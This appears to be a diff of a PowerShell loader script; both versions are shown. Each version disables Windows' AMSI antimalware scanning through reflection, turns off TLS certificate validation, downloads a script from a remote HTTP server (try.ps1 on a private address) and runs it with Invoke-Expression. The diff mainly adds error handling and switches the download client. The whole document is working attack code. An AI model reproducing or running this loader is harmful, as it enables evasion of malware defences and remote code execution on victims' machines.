@@ -1,22 +1,34 @@
 
-$asm = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
-$asm.GetField('amsiInitFailed', 'NonPublic,Static').SetValue($null, $true)
+
+try {
+    $asm = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
+    $field = $asm.GetField('amsiInitFailed', 'NonPublic,Static')
+    $field.SetValue($null, $true)
+} catch {
+    Write-Host "AMSI Bypass failed: $_"
+}
 
 
 $scriptUrl = "http://10.211.55.5:8000/try.ps1"
 
 
 try {
-   
-    $webClient = New-Object Net.WebClient
-    Add-Type -TypeDefinition "using System.Net; using System.Security.Cryptography.X509Certificates; public class TrustAllCerts : ICertificatePolicy { public bool CheckValidationResult(ServicePoint srvPoint, X509Certificate cert, WebRequest request, int certificateProblem) { return true; } }"
-    [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072
-    [System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCerts
-    $scriptContent = $webClient.DownloadString($scriptUrl)
+    $handler = New-Object System.Net.Http.HttpClientHandler
+    $handler.ServerCertificateCustomValidationCallback = { $true }
+    $client = New-Object System.Net.Http.HttpClient($handler)
+
+    $response = $client.GetAsync($scriptUrl).Result 
+    $response.EnsureSuccessStatusCode()
+    $scriptContent = $response.Content.ReadAsStringAsync().Result
 } catch {
-    Write-Host "Error downloading: $_"
-    exit
+    Write-Host "Download failed: $($_.Exception.Message)"
+    exit 1
 }
 
 
-$null = Invoke-Expression $scriptContent
+try {
+    Write-Host "Executing script..."
+    Invoke-Expression $scriptContent
+} catch {
+    Write-Host "Execution failed: $($_.Exception.Message)"
+}
